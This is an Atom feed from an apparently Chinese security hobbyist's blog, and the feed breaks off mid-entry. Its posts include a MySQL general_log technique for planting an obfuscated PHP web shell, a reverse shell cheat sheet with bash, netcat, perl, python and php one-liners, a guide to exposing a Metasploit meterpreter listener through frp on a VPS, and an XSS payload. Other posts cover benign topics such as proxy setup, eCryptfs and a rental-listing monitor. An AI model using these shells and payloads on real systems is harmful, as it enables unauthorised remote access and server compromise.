<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0o0o0丶Blog</title>
  
  <subtitle>0o0o0o0o0o0o0o0o0o0</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://10o0.github.io/"/>
  <updated>2018-08-17T01:45:41.120Z</updated>
  <id>https://10o0.github.io/</id>
  
  <author>
    <name>0o0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>recording</title>
    <link href="https://10o0.github.io/2018/08/17/recording/"/>
    <id>https://10o0.github.io/2018/08/17/recording/</id>
    <published>2018-08-17T01:43:14.000Z</published>
    <updated>2018-08-17T01:45:41.120Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://media.defcon.org/" target="_blank" rel="noopener">https://media.defcon.org/</a></p><p>last:<a href="https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://media.defcon.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://media.defcon.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;last:&lt;a href=&quot;https://media.defco
      
    
    </summary>
    
      <category term="recording" scheme="https://10o0.github.io/categories/recording/"/>
    
    
      <category term="defcon" scheme="https://10o0.github.io/tags/defcon/"/>
    
  </entry>
  
  <entry>
    <title>Ziroom--Monitor</title>
    <link href="https://10o0.github.io/2018/08/13/ziroom/"/>
    <id>https://10o0.github.io/2018/08/13/ziroom/</id>
    <published>2018-08-13T05:53:40.000Z</published>
    <updated>2018-08-13T06:45:48.735Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sat Apr 28 15:52:59 2018</span></span><br><span class="line"><span class="string">@author: root</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment">#itchat.auto_login()</span></span><br><span class="line">itchat.auto_login(hotReload=<span class="keyword">True</span>)</span><br><span class="line">itchat.auto_login(enableCmdQR=<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#from urllib import request</span></span><br><span class="line">url = <span class="string">"http://phoenix.ziroom.com/v7/room/detail.json?house_id=62947781&amp;city_code=110000&amp;id=61544148"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'accept'</span>: <span class="string">'application/json;version=3'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'phoenix.ziroom.com'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'https://hd.ziroom.com/2018/haiyan/index.html?citycode=110000'</span>,</span><br><span class="line"><span class="comment">#    'token': 'd76a826e-bfb4-4421-902e-132418ebedfa',</span></span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'okhttp/3.10.0'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">    <span class="keyword">except</span> requests.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'Error'</span>, e.args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        json_dict = get_page(url)</span><br><span class="line"><span class="comment">#        print(json_dict)</span></span><br><span class="line">        statuss = json_dict[<span class="string">'data'</span>][<span class="string">'status'</span>]</span><br><span class="line">        nowTime=datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">        print(<span class="string">"status:"</span>,statuss)</span><br><span class="line">        <span class="keyword">if</span> statuss == <span class="string">'zxpzz'</span>:</span><br><span class="line">            print(<span class="string">"NOt Time!!!"</span>)</span><br><span class="line">            itchat.send(<span class="string">'&lt;'</span>+str(n)+<span class="string">'&gt;'</span>+<span class="string">'骚年~装修配置中&gt;&gt;&gt;'</span>+nowTime, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">            time.sleep(<span class="number">360</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"GOGOGOOGOOO!!!!!"</span>)</span><br><span class="line">            itchat.send(<span class="string">'&lt;'</span>+str(n)+<span class="string">'&gt;'</span>+<span class="string">'0o0o0o0~可以预定了--gogogogo&gt;&gt;&gt;'</span>+nowTime, toUserName=<span class="string">'filehelper'</span>)</span><br><span class="line">            time.sleep(<span class="number">120</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;figcaption&gt;&lt;span&gt;[] [centos_shell]&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line
      
    
    </summary>
    
      <category term="python" scheme="https://10o0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="ziroom" scheme="https://10o0.github.io/tags/ziroom/"/>
    
  </entry>
  
  <entry>
    <title>【应急响应】自动化脚本</title>
    <link href="https://10o0.github.io/2018/06/27/%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>https://10o0.github.io/2018/06/27/【应急响应】自动化脚本/</id>
    <published>2018-06-27T08:05:15.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
      <category term="应急响应" scheme="https://10o0.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>MySQL&#39;s general-log shell</title>
    <link href="https://10o0.github.io/2018/06/04/MySQL&#39;s%20general-log%20shell/"/>
    <id>https://10o0.github.io/2018/06/04/MySQL&#39;s general-log shell/</id>
    <published>2018-06-04T02:52:12.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MySQL ROOT:</p></blockquote><pre><code>show variables like &apos;%general%&apos;;set global general_log=&apos;on&apos;;SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;;SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;;set global general_log = off;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;MySQL ROOT:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;show variables like &amp;apos;%general%&amp;apos;;
set global general_log=&amp;apos;on&amp;apos;;
S
      
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="mysql" scheme="https://10o0.github.io/tags/mysql/"/>
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
      <category term="log" scheme="https://10o0.github.io/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>Frp结合VPS打造外网Meatsploit</title>
    <link href="https://10o0.github.io/2018/04/19/Frp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit/"/>
    <id>https://10o0.github.io/2018/04/19/Frp＋VPS打造外网Meatsploit/</id>
    <published>2018-04-19T03:04:54.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<hr><ul><li><strong>前言：</strong></li></ul><p>本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本：</p><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><a id="more"></a><p>可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.<br>然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。<br>然后试了下用Frp来转发，相比起来简直不要太爽。</p><p> <strong>1. 准备工作：</strong></p><blockquote><p>VPS一台<br>FRP  ##下载地址：<a href="https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本）</a></p></blockquote><p> <strong>２.安装步骤：</strong><br><strong>在VPS上执行（我的是Centos x64）：</strong></p><pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frptar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64rm frpc&amp;&amp;rm frpc.ini  ##这个是客户端文件，用不上，删不删随意。./frps -c frps.ini　　##默认配置文件启动服务端。</code></pre><p><strong>在自己电脑执行（我的是KALi x64）:</strong></p><pre><code>wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frptar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64rm frps&amp;&amp;rm frps.ini  ##这个是服务端文件，用不上，删不删随意。./frpc -c frpc.ini　　##使用配置文件启动客户端。</code></pre><p> 注意frpc.ini配置文件内容（<a href="https://github.com/fatedier/frp/blob/master/README_zh.md#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">详细参考</a>）：</p><pre><code>[common]server_addr = *.*.*.*  ##VPS的IP地址server_port = 7000[msf]type = tcp　　　　　##协议local_ip = *.*.*.*  ##本地内网主机IP。local_port = 4444　 ##本地MSF监听的端口remote_port = 8011  ##Payload设置的LPORT端口,LHOST为VPS的IP。</code></pre><p>Payload生成实例：</p><pre><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe</code></pre><p>MSf监听示例：</p><pre><code>Module options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (windows/x64/meterpreter_reverse_tcp):   Name        Current Setting  Required  Description   ----        ---------------  --------  -----------   EXITFUNC    process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)   EXTENSIONS                   no        Comma-separate list of extensions to load   EXTINIT                      no        Initialization strings for extensions   LHOST       172.16.1.254     yes       The listen address   LPORT       4444             yes       The listen port</code></pre><p>附一张截图：</p><p><img src="http://image.3001.net/images/20180419/15241064908917.jpg!small" alt=""></p><p>结束语：<br>当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall

chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="msf" scheme="https://10o0.github.io/categories/msf/"/>
    
    
      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
    
      <category term="frp" scheme="https://10o0.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>How to encrypt files and folders with eCryptfs in Ubuntu/Debian/kali linux</title>
    <link href="https://10o0.github.io/2018/03/27/encrypt%20in%20linux/"/>
    <id>https://10o0.github.io/2018/03/27/encrypt in linux/</id>
    <published>2018-03-27T04:36:32.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>apt-get install ecryptfs-utilsmodprobe ecryptfs  #Load the ecryptfs kernel driverecryptfs-setup-private ##defaultecryptfs-umount-private  # to unmountecryptfs-mount-private  # to mount it again,Switch to another directory except home#######ecryptfs-setup-private --noautoumount  # avoid ecryptfs auto mount at login</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;apt-get install ecryptfs-utils

modprobe ecryptfs  #Load the ecryptfs kernel driver

ecryptfs-setup-private ##default

ecryptfs-u
      
    
    </summary>
    
      <category term="encrypt" scheme="https://10o0.github.io/categories/encrypt/"/>
    
    
      <category term="encrypt" scheme="https://10o0.github.io/tags/encrypt/"/>
    
      <category term="eCryptfs" scheme="https://10o0.github.io/tags/eCryptfs/"/>
    
      <category term="kali" scheme="https://10o0.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Shell Cheat Sheet</title>
    <link href="https://10o0.github.io/2018/03/20/Reverse%20Shell%20Cheat%20Sheet/"/>
    <id>https://10o0.github.io/2018/03/20/Reverse Shell Cheat Sheet/</id>
    <published>2018-03-20T06:56:16.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>set a listener:</p></blockquote><pre><code>nc -nvlp 443</code></pre><blockquote><p>Bash:</p></blockquote><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1</code></pre><blockquote><p>Netcat</p></blockquote><pre><code>nc -nv 192.168.1.11 443 -e /bin/bash ##linuxnc.exe -nv 192.168.1.11 443 -e cmd   ##windows</code></pre><blockquote><p>Perl</p></blockquote><pre><code>perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos;</code></pre><blockquote><p>Python</p></blockquote><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><blockquote><p>PHP</p></blockquote><pre><code>php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;set a listener:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;nc -nvlp 443
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Bash:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ba
      
    
    </summary>
    
      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="perl" scheme="https://10o0.github.io/tags/perl/"/>
    
      <category term="netcat" scheme="https://10o0.github.io/tags/netcat/"/>
    
      <category term="php" scheme="https://10o0.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python PyQt5</title>
    <link href="https://10o0.github.io/2018/03/07/Python%E5%AE%9E%E7%94%A8/"/>
    <id>https://10o0.github.io/2018/03/07/Python实用/</id>
    <published>2018-03-07T03:28:47.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Python3，PyQt5实现简易浏览器"><a href="#使用Python3，PyQt5实现简易浏览器" class="headerlink" title="使用Python3，PyQt5实现简易浏览器"></a>使用Python3，PyQt5实现简易浏览器</h1><pre><code>from PyQt5.QtWidgets import QApplicationfrom PyQt5.QtWebEngineWidgets import QWebEngineViewfrom PyQt5.QtCore import QUrlapp = QApplication([])view = QWebEngineView()view.load(QUrl(&quot;https://translate.google.cn&quot;))view.show()app.exec_()</code></pre><hr><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;使用Python3，PyQt5实现简易浏览器&quot;&gt;&lt;a href=&quot;#使用Python3，PyQt5实现简易浏览器&quot; class=&quot;headerlink&quot; title=&quot;使用Python3，PyQt5实现简易浏览器&quot;&gt;&lt;/a&gt;使用Python3，PyQt5实现简易浏览器&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;from PyQt5.QtWidgets import QApplication
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl

app = QApplication([])
view = QWebEngineView()
view.load(QUrl(&amp;quot;https://translate.google.cn&amp;quot;))
view.show()
app.exec_()
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="https://10o0.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
      <category term="pyqt5" scheme="https://10o0.github.io/tags/pyqt5/"/>
    
      <category term="browser" scheme="https://10o0.github.io/tags/browser/"/>
    
  </entry>
  
  <entry>
    <title>How to setup a socks5 proxy server using Dante</title>
    <link href="https://10o0.github.io/2018/01/22/How-to-setup-a-socks5-proxy-server-using-Dante/"/>
    <id>https://10o0.github.io/2018/01/22/How-to-setup-a-socks5-proxy-server-using-Dante/</id>
    <published>2018-01-22T02:26:52.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>debain可用参考链接：https://nfalcone.net/blog/danted-socks-proxy-server/</code></pre><a id="more"></a><p><strong>&gt; 其他：</strong></p><h1 id="socks5软件包安装"><a href="#socks5软件包安装" class="headerlink" title="socks5软件包安装:"></a>socks5软件包安装:</h1><pre><code># apt-get update &amp;&amp; apt-get upgrade# apt-get install dante-server# service danted restart# service danted status# danted -vdanted: dante v1.1.19</code></pre><h1 id="socks5源码安装："><a href="#socks5源码安装：" class="headerlink" title="socks5源码安装："></a>socks5源码安装：</h1><pre><code># cd /usr/src# wget http://www.inet.no/dante/files/dante-1.4.2.tar.gz# tar -zxf dante-1.4.2.tar.gz# cd dante-1.4.2/# apt-get install gcc make#./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-client --without-libwrap --without-bsdauth --without-gssapi --without-krb5 --without-upnp --without-pam# make &amp;&amp; make install# /usr/sbin/sockd -vDante v1.4.2.  Copyright (c) 1997 - 2014 Inferno Nettverk A/S, Norway</code></pre><h1 id="Configuring-Dante-server-service-script"><a href="#Configuring-Dante-server-service-script" class="headerlink" title="Configuring Dante-server service script"></a>Configuring Dante-server service script</h1><pre><code># vim /etc/init.d/sockd</code></pre><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><pre><code>https://www.proxyrack.com/how-to-setup-a-socks5-proxy-server-using-dante/</code></pre><h1 id="debain可能遇到的问题："><a href="#debain可能遇到的问题：" class="headerlink" title="debain可能遇到的问题："></a>debain可能遇到的问题：</h1><blockquote><p>perl: warning: Falling back to the standard locale (“C”)</p></blockquote><pre><code>root@host:~#locale-gen en_GB.UTF-8root@host:~#localectl set-locale LANG=en_GB.UTF-8,LC_ALL=en_GB.UTF-8</code></pre><blockquote><p>参考：<a href="https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/" target="_blank" rel="noopener">https://konradpodgorski.com/blog/2014/06/23/fixing-locale-problem-debian/</a></p></blockquote><p>debain VPs 安装失败：仅作记录</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;debain可用参考链接：

https://nfalcone.net/blog/danted-socks-proxy-server/
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="socks5" scheme="https://10o0.github.io/tags/socks5/"/>
    
      <category term="proxy" scheme="https://10o0.github.io/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>SS安装脚本</title>
    <link href="https://10o0.github.io/2018/01/22/SS%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/"/>
    <id>https://10o0.github.io/2018/01/22/SS安装脚本/</id>
    <published>2018-01-22T02:01:21.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一键安装："><a href="#一键安装：" class="headerlink" title="一键安装："></a>一键安装：</h1><pre><code>wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</code></pre><blockquote><p>多用户配置文件：vim /etc/shadowsocks-go/config.json</p></blockquote><pre><code>{    &quot;server&quot;:&quot;0.0.0.0&quot;,    &quot;port_password&quot;:{         &quot;8989&quot;:&quot;password0&quot;,         &quot;9001&quot;:&quot;password1&quot;,         &quot;9002&quot;:&quot;password2&quot;,         &quot;9003&quot;:&quot;password3&quot;,         &quot;9004&quot;:&quot;password4&quot;    },    &quot;method&quot;:&quot;aes-256-cfb&quot;,    &quot;timeout&quot;:600}</code></pre><h1 id="卸载："><a href="#卸载：" class="headerlink" title="卸载："></a>卸载：</h1><pre><code>./shadowsocks-all.sh uninstall</code></pre><a id="more"></a><h1 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h1><blockquote><p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。</p></blockquote><pre><code>echo &quot;alias ss=&apos;/etc/init.d/shadowsocks-go&apos;&quot; &gt;&gt; .bashrcShadowsocks-Python 版：/etc/init.d/shadowsocks-python start | stop | restart | statusShadowsocksR 版：/etc/init.d/shadowsocks-r start | stop | restart | statusShadowsocks-Go 版：/etc/init.d/shadowsocks-go start | stop | restart | statusShadowsocks-libev 版：/etc/init.d/shadowsocks-libev start | stop | restart | status各版本默认配置文件Shadowsocks-Python 版：/etc/shadowsocks-python/config.jsonShadowsocksR 版：/etc/shadowsocks-r/config.jsonShadowsocks-Go 版：/etc/shadowsocks-go/config.jsonShadowsocks-libev 版：/etc/shadowsocks-libev/config.json</code></pre><h1 id="VPS测速脚本："><a href="#VPS测速脚本：" class="headerlink" title="VPS测速脚本："></a>VPS测速脚本：</h1><pre><code>wget -qO- –no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bashwget -qO- bench.sh | bash   或者     curl -Lso- bench.sh | bash</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一键安装：&quot;&gt;&lt;a href=&quot;#一键安装：&quot; class=&quot;headerlink&quot; title=&quot;一键安装：&quot;&gt;&lt;/a&gt;一键安装：&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh
chmod +x shadowsocks-all.sh
./shadowsocks-all.sh 2&amp;gt;&amp;amp;1 | tee shadowsocks-all.log
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;多用户配置文件：vim /etc/shadowsocks-go/config.json&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;server&amp;quot;:&amp;quot;0.0.0.0&amp;quot;,
    &amp;quot;port_password&amp;quot;:{
         &amp;quot;8989&amp;quot;:&amp;quot;password0&amp;quot;,
         &amp;quot;9001&amp;quot;:&amp;quot;password1&amp;quot;,
         &amp;quot;9002&amp;quot;:&amp;quot;password2&amp;quot;,
         &amp;quot;9003&amp;quot;:&amp;quot;password3&amp;quot;,
         &amp;quot;9004&amp;quot;:&amp;quot;password4&amp;quot;
    },
    &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot;,
    &amp;quot;timeout&amp;quot;:600
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;卸载：&quot;&gt;&lt;a href=&quot;#卸载：&quot; class=&quot;headerlink&quot; title=&quot;卸载：&quot;&gt;&lt;/a&gt;卸载：&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;./shadowsocks-all.sh uninstall
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ss" scheme="https://10o0.github.io/tags/ss/"/>
    
      <category term="shadowsocks" scheme="https://10o0.github.io/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>Xss常用测试代码</title>
    <link href="https://10o0.github.io/2018/01/18/Xss%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81/"/>
    <id>https://10o0.github.io/2018/01/18/Xss常用测试代码/</id>
    <published>2018-01-18T07:54:28.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>简单测试代码：</p></blockquote><pre><code>&lt;img src=&quot;#&quot; onerror=&quot;alert(111)&quot;&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;简单测试代码：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;#&amp;quot; onerror=&amp;quot;alert(111)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="xss" scheme="https://10o0.github.io/tags/xss/"/>
    
      <category term="js" scheme="https://10o0.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>msf常用命令</title>
    <link href="https://10o0.github.io/2018/01/18/msf-shell/"/>
    <id>https://10o0.github.io/2018/01/18/msf-shell/</id>
    <published>2018-01-18T02:22:16.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
